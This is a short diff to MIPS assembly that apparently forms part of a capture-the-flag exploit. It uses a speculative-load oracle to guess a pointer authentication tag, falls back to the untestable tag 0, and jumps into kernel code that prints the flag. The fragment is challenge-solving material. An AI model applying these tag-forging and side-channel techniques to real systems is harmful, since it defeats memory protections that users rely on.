@@ -82,8 +82,11 @@ found:
     or   $t0, $t0, $s4          # {tag, 0x2030}
     jr   $t0                    # authenticated cross -> kernel prints the flag
     nop
-giveup:
-    dli  $t3, 0x0000000a544c4148 # "HALT\n" (no tag found -> bail)
-    sd   $t3, 0($s1)
-1:  j 1b
+giveup:                           # every gated guess missed => the oracle's one blind
+                                  # spot is tag 0: guess 0 has a zero top byte, so its
+                                  # shadow load is NOT gated and never probes. Hence the
+                                  # tag must be 0 -> cross with {0, 0x2030}. No bad-tag
+                                  # fault was ever committed, so the gate is still open
+                                  # and this authenticates cleanly.
+    jr   $s4                      # jr {tag=0, VA=0x2030}
     nop
